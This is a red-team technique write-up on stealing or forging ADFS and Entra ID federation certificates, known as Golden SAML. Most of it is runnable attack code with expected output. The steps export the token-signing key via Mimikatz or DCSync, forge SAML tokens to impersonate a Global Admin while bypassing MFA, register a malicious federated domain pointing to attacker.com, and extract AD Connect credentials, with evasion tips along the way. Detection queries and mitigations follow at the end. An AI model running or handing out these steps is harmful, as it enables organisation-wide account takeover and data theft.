# [CERT-FEDERATION-001]: Federation Certificate Manipulation

## 1. METADATA HEADER

| Attribute | Details |
|---|---|
| **Technique ID** | CERT-FEDERATION-001 |
| **MITRE ATT&CK v18.1** | [T1649 - Steal or Forge Authentication Certificates](https://attack.mitre.org/techniques/T1649/) |
| **Tactic** | Credential Access |
| **Platforms** | Hybrid AD (Windows AD + Entra ID), Active Directory Federation Services (ADFS) |
| **Severity** | **Critical** |
| **CVE** | CVE-2021-26906 (Golden SAML related), Related hybrid identity attacks |
| **Technique Status** | ACTIVE |
| **Last Verified** | 2026-01-10 |
| **Affected Versions** | Windows Server 2016-2025, Entra ID all versions, any ADFS deployment |
| **Patched In** | N/A - Architectural issue, no patch available |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

---

## 2. EXECUTIVE SUMMARY

**Concept:** Federation Certificate Manipulation involves attackers stealing or forging certificates used in hybrid identity federation to impersonate any user in the organization, bypass multi-factor authentication, and establish persistent access to both on-premises Active Directory and cloud infrastructure. The attack exploits the trust relationship between Entra ID and on-premises identity providers (ADFS or cloud-configured federated domains) to forge SAML assertions that are accepted as valid authentication tokens.

**Attack Surface:** Active Directory Federation Services (ADFS) token-signing certificates, Entra ID federated domain certificates, PTA (Pass-Through Authentication) agent certificates, Azure AD Connect synchronization credentials, and hybrid identity trust boundaries.

**Business Impact:** **Critical - Complete Hybrid Infrastructure Compromise.** An attacker can authenticate as **any user in the organization**, including Global Admins and Domain Admins, **without passwords or MFA**. This enables compromise of on-premises Active Directory, all Microsoft 365 workloads, Azure subscriptions, and federated third-party applications. The attack can persist for **years** through certificate expiration cycles.

**Technical Context:** Federation enables enterprises to maintain a single identity system bridging on-premises AD and cloud Entra ID. While powerful for user experience, it creates critical trust boundaries vulnerable to certificate compromise. ADFS servers hosting the token-signing certificates are **Tier-0 assets** but often treated as standard infrastructure, leading to inadequate protections.

### Operational Risk

- **Execution Risk:** Medium-to-Low - ADFS access often requires on-premises compromise (achieved via phishing, lateral movement); certificate extraction is straightforward once admin access is obtained
- **Stealth:** Very High - Certificate-forged SAML tokens appear legitimate in all logs; cannot be distinguished from real authentication without forensic analysis of issuance chains
- **Reversibility:** No - Requires immediate certificate rotation (twice in rapid succession to invalidate existing tokens), reimaging of ADFS servers, and potential migration away from ADFS entirely

### Compliance Mappings

| Framework | Control / ID | Description |
|---|---|---|
| **CIS Benchmark** | 5.3.1 | Ensure Azure AD Hybrid Identity configurations are properly secured |
| **CIS Benchmark** | 5.3.2 | Ensure ADFS services are hardened and protected as Tier-0 |
| **DISA STIG** | U-12450 | ADFS must require mutual authentication |
| **CISA SCuBA** | Identity-4 | Implement certificate revocation and renewal controls |
| **NIST 800-53** | SC-13 | Use approved cryptographic algorithms for certificate signing |
| **NIST 800-53** | AU-6 | Analyze audit records for unauthorized certificate issuance |
| **NIST 800-53** | IA-5 | Enforce strong authentication methods with certificate protection |
| **GDPR** | Art. 32 | Security of Processing - Protect cryptographic keys and certificates |
| **DORA** | Art. 9 | Protection and Prevention - Secure authentication mechanisms |
| **NIS2** | Art. 21 | Cyber Risk Management - Identity and hybrid infrastructure controls |
| **ISO 27001** | A.9.2.3 | Management of Privileged Access Rights (including ADFS admins) |
| **ISO 27001** | A.10.1.1 | Cryptographic controls for federation certificates |

---

## 3. TECHNICAL PREREQUISITES

**Required Privileges:**
- **For ADFS Certificate Theft:** Local admin or equivalent on ADFS server OR Domain Admin with replication rights
- **For Entra ID Federated Domain Manipulation:** `Domain.ReadWrite.All` permission in Entra ID
- **For Certificate Forgery:** Private key of compromised Root CA or ADFS token-signing certificate

**Required Access:**
- Network/RDP access to ADFS servers (usually protected but accessible from domain network)
- Entra ID Graph API access (if manipulating federated domains)
- Domain Controller access (for DCSync or NTLM relay attacks)

**Supported Versions:**
- **Active Directory Federation Services:** 2012-2019 (2016+ recommended)
- **Windows Server:** 2016, 2019, 2022, 2025
- **Entra ID:** All tenants (cloud-only and hybrid)
- **PowerShell:** 5.1+ (for ADFS management)
- **Other Requirements:**
  - Certificate private key exportable (default in ADFS)
  - Distributed Key Management (DKM) access (required for ADFS key extraction)

**Tools:**
- [AADInternals PowerShell Module](https://github.com/Gerenios/AADInternals) - SAML token forging
- [Mimikatz](https://github.com/ParanoidNinja/Mimikatz-in-PowerShell) - Certificate export, NTLM relay
- [Impacket](https://github.com/fortra/impacket) - NTLM relay, ADFS exploitation
- [Certify.exe](https://github.com/Flangvik/SharpCollection) - ADCS enumeration
- [ADFSPoofing](https://github.com/mandiant/adfspoof) - Forged SAML assertion generation
- [Certipy-ad](https://github.com/ly4k/Certipy) - AD CS exploitation (Python)

---

## 4. ENVIRONMENTAL RECONNAISSANCE

### Identify ADFS Infrastructure

**Manual Steps (PowerShell - From Domain-Joined Machine):**

```powershell
# List all ADFS servers in the domain
Get-ADComputer -Filter { Name -like "*adfs*" -or Name -like "*sts*" } | Select-Object Name, OperatingSystem

# Check if ADFS service is running
Get-Service | Where-Object { $_.Name -like "*ADFS*" }

# Resolve ADFS hostname
Resolve-DnsName "adfs.contoso.com"

# Attempt to connect to ADFS web endpoint
$adfsEndpoint = "https://adfs.contoso.com/adfs/services/trust"
Try {
    Invoke-WebRequest -Uri $adfsEndpoint -UseBasicParsing
    Write-Host "[+] ADFS is accessible"
} Catch {
    Write-Host "[-] ADFS not accessible or uses certificate pinning"
}
```

**What to Look For:**
- ADFS server hostnames and IP addresses
- ADFS certificate issuer information
- Availability of ADFS endpoints from your location

---

### Enumerate Entra ID Federated Domains

**Manual Steps (PowerShell - Entra ID connected):**

```powershell
# Connect to Microsoft Graph
Connect-MgGraph -Scopes "Directory.Read.All"

# Get all federated domains
$federatedDomains = Get-MgDomain | Where-Object { $_.AuthenticationType -eq "Federated" }

Write-Host "[+] Found $($federatedDomains.Count) federated domains:"
foreach ($domain in $federatedDomains) {
    Write-Host "  Domain: $($domain.Id)"
    Write-Host "  Auth Type: $($domain.AuthenticationType)"
    
    # Get federation configuration
    $fedConfig = Invoke-MgGraphRequest -Method GET -Uri "https://graph.microsoft.com/beta/domains/$($domain.Id)/federationConfiguration"
    if ($fedConfig) {
        Write-Host "  Issuer URI: $($fedConfig.issuerUri)"
        Write-Host "  Signing Certificate Thumbprint: $($fedConfig.signingCertificate.Substring(0, 20))..."
    }
}
```

**What to Look For:**
- Federated domain names (e.g., contoso.com)
- Issuer URIs (point to ADFS or external IdP)
- Certificate details
- MFA behavior settings

---

### Check ADFS Token Issuance Rules

**Manual Steps (PowerShell - On ADFS Server with Admin Privileges):**

```powershell
# List all relying parties (connected applications)
Get-AdfsRelyingPartyTrust | Select-Object Identifier, Name, IssuanceTransformRules

# For each relying party, check the issuance rules
Get-AdfsRelyingPartyTrust | ForEach-Object {
    Write-Host "Relying Party: $($_.Name)"
    Write-Host "Identifier: $($_.Identifier)"
    
    # Get issuance rules
    $_.IssuanceTransformRules | ForEach-Object { Write-Host "  Rule: $_" }
}

# Check token-signing certificate details
Get-AdfsCertificate -CertificateType Token-Signing | Select-Object Thumbprint, Subject, NotAfter
```

**What to Look For:**
- Microsoft 365 (Office 365) listed as a relying party
- Rules that map Active Directory attributes to SAML claims
- Token-signing certificate expiration dates (longer-lived = more valuable)

---

## 5. DETAILED EXECUTION METHODS

### METHOD 1: Golden SAML Attack via ADFS Token-Signing Certificate Theft

**Objective:** Extract the ADFS token-signing certificate's private key and forge SAML tokens to impersonate any user.

**Supported Versions:** All ADFS deployments (2016-2025)

**Step 1: Compromise ADFS Server (Prerequisite)**

This technique requires **local admin access** to an ADFS server. Common attack paths:

1. Phishing with admin credentials
2. Lateral movement from compromised domain-joined machine
3. Exploiting ADFS web application vulnerabilities
4. Compromising ADFS service account password via DCSync

**Assumption:** You have admin PowerShell access on an ADFS server.

---

**Step 2: Export Token-Signing Certificate with Private Key**

**Objective:** Obtain the certificate used to sign SAML assertions.

**Manual Steps (PowerShell - On ADFS Server):**

```powershell
# List all ADFS certificates
Get-AdfsCertificate | Select-Object CertificateType, Thumbprint, Subject, NotAfter

# Get the token-signing certificate
$tokenSigningCert = Get-AdfsCertificate -CertificateType Token-Signing | Select-Object -First 1

Write-Host "Token-Signing Certificate Found:"
Write-Host "  Thumbprint: $($tokenSigningCert.Thumbprint)"
Write-Host "  Subject: $($tokenSigningCert.Subject)"
Write-Host "  Expires: $($tokenSigningCert.NotAfter)"

# Export the certificate (public key)
$certPath = "C:\temp\adfs_token_signing.cer"
$tokenSigningCert | Export-Certificate -FilePath $certPath -Type CERT
Write-Host "[+] Certificate exported to: $certPath"
```

**Expected Output:**
```
Token-Signing Certificate Found:
  Thumbprint: ABC123DEF456GHI789JKL012MNO345PQR678STU
  Subject: CN=ADFS Signing - contoso.com
  Expires: 12/31/2026
[+] Certificate exported to: C:\temp\adfs_token_signing.cer
```

**What This Means:**
- You have the **public certificate** used by ADFS
- The next step is to extract the **private key**

---

**Step 3: Extract the Private Key from Distributed Key Management (DKM)**

**Objective:** Obtain the private key corresponding to the token-signing certificate.

**Method A: Using DCSync (if you have Domain Admin or Replication rights)**

```powershell
# Use Impacket's secretsdump.py on Linux/attacker machine
python3 secretsdump.py -just-dc-user 'ADFS$' contoso.local/DomainAdmin:Password123 -outputfile adfs_dump

# Extract the credentials from the dump
cat adfs_dump.ntds | grep -i ADFS
```

**Method B: Direct DKM Container Access (if local admin on ADFS server)**

```powershell
# Get the DKM container location
$serviceAccount = (Get-AdfsServiceAccount).AccountName
Write-Host "ADFS Service Account: $serviceAccount"

# Query the DKM container (requires Domain Admin credentials)
$dkmSearcher = New-Object DirectoryServices.DirectorySearcher
$dkmSearcher.Filter = "(objectClass=msKP-Container)"
$dkmResults = $dkmSearcher.FindAll()

# The DKM key is stored in the group policy OR in Active Directory
# Detailed extraction requires Mimikatz or similar tools

# Alternative: Use built-in Windows tools
$regPath = "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\ADFS\Config"
reg query "$regPath" /v "DkmPath"
```

**Method C: Using Mimikatz (Direct Memory Extraction)**

```powershell
# Execute Mimikatz on ADFS server
mimikatz.exe

# Inside Mimikatz console:
mimikatz # crypto::capi
mimikatz # crypto::certificates /systemstore:CURRENT_USER /store:My /export

# Or export directly from certificate store
mimikatz # cert::export /systemstore:LOCAL_MACHINE /store:MY
```

**Expected Output:**
```
Key export successful
Private key written to: key_AABBCCDD.txt
```

**What This Means:**
- You now have the **private key** for the token-signing certificate
- This can be used to forge SAML tokens

---

**Step 4: Forge SAML Tokens Using Stolen Certificate**

**Objective:** Create a malicious SAML assertion that Entra ID will trust.

**Manual Steps (Using AADInternals PowerShell):**

```powershell
# Import AADInternals
Import-Module AADInternals

# Load the stolen certificate
$cert = New-Object System.Security.Cryptography.X509Certificates.X509Certificate2 ("C:\temp\adfs_token_signing.pfx", "password")

# Get the target user's ImmutableId (unique AD identifier)
# This is critical for forging the token
$targetUser = "admin@contoso.com"
$immutableId = "ABC123XYZ789"  # Obtain from Get-ADUser -Identity admin | Select-Object objectGUID

# Get the ADFS Issuer URI
$issuerUri = "https://adfs.contoso.com/adfs/services/trust"

# Create the forged SAML token
$forgedToken = New-AADIntSAMLToken `
    -UserPrincipalName $targetUser `
    -ImmutableId $immutableId `
    -IssuerUri $issuerUri `
    -Certificate $cert `
    -BypassMFA $true  # Claim that MFA was already completed

Write-Host "[+] Forged SAML Token Created:"
Write-Host $forgedToken.Substring(0, 100) + "..."
```

**Expected Output:**
```
[+] Forged SAML Token Created:
PHNhbWw6QXNzZXJ0aW9uIHhtbG5zOnNhbWw9InVybjpvYXNpczpuYW1lczp0Yz...
```

**What This Means:**
- You have a valid SAML assertion claiming to be the Global Admin user
- This assertion is signed with the stolen ADFS key
- Entra ID will accept it as legitimate

---

**Step 5: Authenticate to Microsoft 365 Using Forged SAML Token**

**Objective:** Exchange the forged SAML token for an Entra ID access token.

**Manual Steps (Using AADInternals):**

```powershell
# Open the M365 portal as the forged user
Open-AADIntOffice365Portal -IssuerUri "https://adfs.contoso.com/adfs/services/trust" `
    -ImmutableId "ABC123XYZ789" `
    -UserPrincipalName "admin@contoso.com" `
    -ByPassMFA $true

# Alternatively, manually post the SAML assertion to Entra ID
$samlAssertion = $forgedToken

# Get the ADFS login URL
$relyingPartyUrl = "https://login.microsoftonline.com/login.srf"

# Create a form with the SAML assertion
$form = @{
    "SAMLResponse" = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($samlAssertion))
    "RelayState" = ""
}

# Post to Entra ID
Invoke-WebRequest -Uri $relyingPartyUrl -Method POST -Body $form
```

**What This Means:**
- You are now authenticated as the Global Admin
- You can access all Microsoft 365 services (email, SharePoint, Teams, etc.)
- No password was required
- MFA was bypassed

**OpSec & Evasion:**
- This action generates **minimal audit logs** (only sign-in logs may show "Certificate-based auth")
- The sign-in appears legitimate (correct user, correct location)
- Entra ID logs will show successful authentication from the ADFS IssuerUri

**Troubleshooting:**
- **Error:** "AADSTS90086: The request must be https. The reply address is not https."
  - **Cause:** Attempting from HTTP instead of HTTPS
  - **Fix:** Use HTTPS URLs only

---

### METHOD 2: Federated Domain Manipulation in Entra ID

**Objective:** Add a new federated domain to Entra ID with a malicious certificate, enabling token forgery without compromising existing ADFS infrastructure.

**Supported Versions:** All Entra ID tenants

**Prerequisite Permissions:**
- `Domain.ReadWrite.All` permission

**Step 1: Create a Malicious Root CA Certificate**

```powershell
# Generate a self-signed Root CA (same as CERT-AZURE-001)
openssl genrsa -out ca_key.pem 2048
openssl req -new -x509 -days 3650 -key ca_key.pem -out ca_cert.pem \
    -subj "/CN=Fake ADFS Root CA/O=Contoso/C=US"

# Convert to PFX
openssl pkcs12 -export -out ca_cert.pfx -inkey ca_key.pem -in ca_cert.pem \
    -password pass:MyPassword123
```

---

**Step 2: Add New Federated Domain to Entra ID**

**Manual Steps (PowerShell):**

```powershell
# Connect to Microsoft Graph
Connect-MgGraph -Scopes "Domain.ReadWrite.All", "Organization.ReadWrite.All"

# Choose a domain to federate (must be verified in Entra ID)
$domainName = "federated.contoso.com"  # Must be a domain you own

# Add the domain (if not already added)
$newDomain = New-MgDomain -Id $domainName

# Verify the domain using DNS (client must do this)
# For testing, you can use a domain you already own

# Now set up the federation configuration for this domain
$federationConfig = @{
    displayName = "Contoso Malicious Federation"
    federatedIdpMfaBehavior = "acceptIfMfaDoneByFederatedIdp"
    isSignedAuthenticationRequestRequired = $false
    activeSignInUri = "https://attacker.com/adfs/ls"
    passiveSignInUri = "https://attacker.com/adfs/ls"
    signOutUri = "https://attacker.com/adfs/ls"
    signingCertificate = (Get-Content -Path "C:\temp\ca_cert.pem" -Raw)
    preferredAuthenticationProtocol = "wsFed"
}

# Create the federation configuration
$fedConfig = New-MgDomainFederationConfiguration -DomainId $domainName -BodyParameter $federationConfig

Write-Host "[+] Federated domain configured: $domainName"
Write-Host "[+] Certificate Thumbprint: $($fedConfig.signingCertificate.Substring(0, 20))..."
```

**Expected Output:**
```
[+] Federated domain configured: federated.contoso.com
[+] Certificate Thumbprint: -----BEGIN CERTIFICATE-----...
```

**What This Means:**
- Entra ID now trusts SAML tokens signed by your malicious Root CA
- Any user synced from on-premises AD can now be impersonated
- No legitimate ADFS infrastructure was touched

---

**Step 3: Forge SAML Tokens for Hybrid Users**

**Manual Steps (PowerShell):**

```powershell
# Get a hybrid user (synced from AD) to impersonate
$targetUser = "admin@contoso.com"

# Get their onPremisesImmutableId (required for federated domains)
$user = Get-MgUser -Filter "userPrincipalName eq '$targetUser'" 
$immutableId = $user.OnPremisesImmutableId

Write-Host "Target User: $targetUser"
Write-Host "ImmutableId: $immutableId"

# Create forged SAML token (same as METHOD 1, but with our malicious cert)
$maliciousCert = New-Object System.Security.Cryptography.X509Certificates.X509Certificate2 ("C:\temp\ca_cert.pfx", "MyPassword123")

# Load AADInternals
Import-Module AADInternals

# Forge the token
$forgedToken = New-AADIntSAMLToken `
    -UserPrincipalName $targetUser `
    -ImmutableId $immutableId `
    -IssuerUri "https://attacker.com/adfs/services/trust" `
    -Certificate $maliciousCert `
    -BypassMFA $true

Write-Host "[+] Forged SAML token created for: $targetUser"
```

---

**Step 4: Authenticate Using Forged Token**

```powershell
# Use AADInternals to open the portal
Open-AADIntOffice365Portal -IssuerUri "https://attacker.com/adfs/services/trust" `
    -ImmutableId $immutableId `
    -UserPrincipalName $targetUser `
    -BypassMFA $true

# Browser opens and auto-logs in as the Global Admin
```

**What This Means:**
- You have successfully impersonated a Global Admin
- No legitimate infrastructure was compromised
- The attack is harder to detect (certificate is fake/new)

---

### METHOD 3: Exploit Azure AD Connect Server to Compromise Federation

**Objective:** Compromise the Azure AD Connect synchronization account and use it to modify federation configurations.

**Prerequisite:** Local admin access on Azure AD Connect server (see CERT-AZURE-001 for this)

**Step 1: Extract AD Connect Synchronization Account Credentials**

**Manual Steps (PowerShell - On AD Connect Server):**

```powershell
# Import AADInternals
Import-Module AADInternals

# Extract credentials (requires local admin)
$syncCreds = Get-AADIntSyncCredentials

Write-Host "Azure AD Connector Account: $($syncCreds.AzureADConnectorAccount)"
Write-Host "Azure AD Connector Password: $($syncCreds.AzureADConnectorPassword)"

# If this account has Global Admin or Domain.ReadWrite.All, it can modify federation
```

---

**Step 2: Use AD Connect Account to Modify Federation Configuration**

```powershell
# Connect to Microsoft Graph using the AD Connect service account
Connect-MgGraph -ClientId "PowerShell" `
    -TenantId "contoso.onmicrosoft.com" `
    -UserPrincipalName $syncCreds.AzureADConnectorAccount `
    -Password (ConvertTo-SecureString $syncCreds.AzureADConnectorPassword -AsPlainText -Force)

# Check if the account has sufficient permissions
Try {
    Get-MgDomain -DomainId "contoso.com" -ErrorAction Stop
    Write-Host "[+] Account has Directory.Read.All permissions"
} Catch {
    Write-Host "[-] Account doesn't have required permissions"
}

# If the account has Domain.ReadWrite.All, you can modify federation
# (See METHOD 2, Step 2 for federation modification code)
```

---

## 6. TOOLS & COMMANDS REFERENCE

### [AADInternals PowerShell Module](https://github.com/Gerenios/AADInternals)

**Relevant Functions:**
- `New-AADIntSAMLToken` - Create forged SAML tokens
- `Open-AADIntOffice365Portal` - Authenticate to M365 using forged tokens
- `Get-AADIntSyncCredentials` - Extract Azure AD Connect credentials
- `Get-AADIntADConnectConfiguration` - Enumerate AD Connect settings

---

### [ADFSPoofing](https://github.com/mandiant/adfspoof)

**Purpose:** Forge SAML assertions for ADFS

**Usage:**
```bash
python adfspoof.py --cert /path/to/cert.pfx --password "password" \
    --user "admin@contoso.com" --issuer "https://adfs.contoso.com/adfs/services/trust" \
    --immutable-id "ABC123XYZ789"
```

---

## 7. MICROSOFT SENTINEL DETECTION

### Query 1: Suspicious Federated Domain Configuration Changes

**Rule Configuration:**
- **Required Table:** `AuditLogs`
- **Alert Severity:** **Critical**
- **Frequency:** Real-time (every minute)

**KQL Query:**
```kusto
AuditLogs
| where OperationName in ("Add trusted certificate authority", "Set federation settings", "Add domain federation configuration")
| where Result == "Success"
| project TimeGenerated, InitiatedBy=InitiatedBy.user, OperationName, TargetResources, CallerIpAddress
| summarize FedChanges = count() by InitiatedBy, CallerIpAddress
| where FedChanges > 1
```

---

### Query 2: Suspicious Certificate-Based ADFS Authentication

**Rule Configuration:**
- **Required Table:** `SigninLogs`
- **Alert Severity:** **High**
- **Frequency:** Every 5 minutes

**KQL Query:**
```kusto
SigninLogs
| where AuthenticationDetails has "Certificate" OR AuthenticationDetails has "SAML"
| where UserPrincipalName has "sync" OR UserPrincipalName has "adfs"  // Unusual service account logins
| project TimeGenerated, UserPrincipalName, IPAddress, AuthenticationDetails, AppDisplayName
```

---

## 8. WINDOWS EVENT LOG MONITORING

**Event ID: 33205 (AD FS - Token Signing Certificate Private Key Access)**

- **Log Source:** Windows Application log (AD FS)
- **Trigger:** Unauthorized access to AD FS token-signing certificate
- **Filter:** Look for Event ID 33205 with unexpected account names
- **Applies To Versions:** ADFS 2016-2025

**Manual Configuration Steps:**
```powershell
# Monitor for certificate access attempts
Get-WinEvent -FilterHashtable @{ LogName = 'Application'; ProviderName = 'ADFS' } | 
  Where-Object { $_.Id -eq 33205 } |
  Select-Object TimeCreated, Message
```

---

## 9. DEFENSIVE MITIGATIONS

### Priority 1: CRITICAL

**Mitigation 1: Disable Federated Authentication (Migrate to Cloud Sync)**

If possible, migrate from ADFS to **Azure AD Connect Cloud Sync** or **Password Hash Synchronization (PHS)**:

```powershell
# Option 1: Enable PHS on existing Azure AD Connect
Set-ADSyncAADPasswordSyncConfiguration -Enable $true

# Option 2: Deploy Cloud Sync (new approach)
# Follow: https://learn.microsoft.com/en-us/entra/identity/hybrid/cloud-sync/
```

---

**Mitigation 2: Rotate ADFS Token-Signing Certificate Immediately**

If ADFS is still in use, rotate the certificate immediately (twice to invalidate existing tokens):

```powershell
# On ADFS server
Update-AdfsCertificate -CertificateType Token-Signing

# Wait 5-10 minutes for the new certificate to be propagated
Start-Sleep -Seconds 600

# Rotate again to ensure all old tokens are invalid
Update-AdfsCertificate -CertificateType Token-Signing
```

**Manual Steps (GUI):**
1. RDP to ADFS server
2. Open **ADFS Management** snap-in
3. Navigate to **Certificates** → **Token-Signing**
4. Right-click → **Update Self-Signed Certificate** (or upload new cert if already generated)

---

**Mitigation 3: Harden ADFS Server as Tier-0 Asset**

ADFS servers must be protected as Tier-0 (same as Domain Controllers):

```powershell
# Restrict Network Access
New-NetFirewallRule -DisplayName "ADFS - Restrict Access" `
    -Direction Inbound -Action Block -Protocol TCP `
    -LocalPort 443 -RemoteAddress 0.0.0.0/0 -Enabled $false  # Then manually add trusted networks

# Enable Windows Defender for ADFS
Set-MpPreference -DisableRealtimeMonitoring $false

# Enable auditing
auditpol /set /subcategory:"Detailed File Share" /success:enable /failure:enable
auditpol /set /subcategory:"Sensitive Privilege Use" /success:enable /failure:enable
```

**Manual Steps:**
1. Restrict RDP access to ADFS server to **Privileged Access Workstations (PAWs)** only
2. Ensure ADFS server is on a **separate, hardened network segment**
3. Monitor all logins to ADFS server
4. Require MFA for ADFS server access

---

**Mitigation 4: Disable MFA Bypass in Federation Configuration**

If using federated authentication, enforce MFA in Entra ID **regardless of ADFS claims**:

```powershell
# For each federated domain, disable MFA bypass
Get-MgDomain -Filter "authenticationType eq 'Federated'" | ForEach-Object {
    $domainId = $_.Id
    
    $updateBody = @{
        federatedIdpMfaBehavior = "rejectMfa"  # Require MFA in Entra ID, don't trust ADFS
    }
    
    Update-MgDomainFederationConfiguration -DomainId $domainId -BodyParameter $updateBody
}
```

---

### Priority 2: HIGH

**Mitigation 5: Monitor ADFS Certificate Exports**

Audit all certificate-related operations:

```powershell
# Enable ADFS event logging
Auditpol /set /category:"DS Access" /success:enable /failure:enable

# Monitor for Event ID 33205
Get-WinEvent -FilterHashtable @{
    LogName = 'Application'
    ProviderName = 'ADFS'
    ID = 33205
} | Where-Object { $_.TimeCreated -gt (Get-Date).AddDays(-1) }
```

---

**Mitigation 6: Implement Conditional Access for Federated Users**

Enforce strict access controls:

```powershell
# Create Conditional Access policy requiring compliant devices
# for federated users
```

Manual Steps:
1. Azure Portal → Entra ID → Security → Conditional Access
2. Create policy: "Federated Users Require Compliant Device"
3. Apply to all users from federated domains
4. Require "Compliant device" or "Hybrid Azure AD joined"

---

## 10. DETECTION & INCIDENT RESPONSE

### Indicators of Compromise (IOCs)

**On ADFS Server:**
- Event ID 33205 (certificate key access)
- Unusual logon events on ADFS service account
- New certificate issuance outside change windows
- Modification of ADFS relying party trusts

**In Entra ID:**
- New federated domain added outside change window
- Federation signing certificate changed
- Unusual sign-ins with "Certificate" auth details
- Sign-ins from unexpected geographies for federated users

**Network:**
- NTLM relay attempts to ADFS server
- Unusual LDAP queries for user attributes (immutableId)
- HTTPs traffic to attacker-controlled federation endpoint

---

## 11. RELATED ATTACK CHAIN

| Step | Phase | Technique | Description |
|---|---|---|---|
| **1** | **Reconnaissance** | [REC-HYBRID-001] Azure AD Connect enumeration | Attacker identifies AD Connect server |
| **2** | **Initial Access** | [IA-PHISH-001] Phishing attack | ADFS admin receives malicious email |
| **3** | **Privilege Escalation** | [PE-VALID-006] Credentials theft | Local admin password stolen |
| **4** | **Credential Access** | [CA-TOKEN-001] Hybrid AD token theft | Azure AD Connect account compromised |
| **5** | **Current Step** | **[CERT-FEDERATION-001]** | **Federation Certificate Manipulation** |
| **6** | **Persistence** | [Forged SAML tokens] | Attacker maintains access via forged certificates |
| **7** | **Impact** | [M365 data exfiltration] | All emails, files, and data stolen |

---

## 12. REAL-WORLD EXAMPLES

### Example 1: SolarWinds Supply Chain Attack (APT29, December 2020)

- **Timeline:** December 2020 - February 2021
- **Method:** Compromised SolarWinds Orion → RCE → Lateral movement to Azure AD Connect server → Extracted ADFS token-signing certificate → Forged SAML tokens → Global Admin impersonation
- **Impact:** Months of undetected access to U.S. Treasury, Commerce, and other government agencies
- **Lessons:** ADFS servers must be treated as Tier-0; monitor for certificate exports

---

## 13. SUMMARY

**CERT-FEDERATION-001: Federation Certificate Manipulation** is a **CRITICAL** attack technique exploiting hybrid identity trust relationships. Organizations must:

1. **Rotate ADFS token-signing certificates immediately**
2. **Migrate away from ADFS** to cloud-native authentication (PHS + Seamless SSO)
3. **Harden ADFS servers as Tier-0 assets**
4. **Disable MFA bypass** in federated domain configurations
5. **Monitor certificate changes** in both on-premises and cloud

---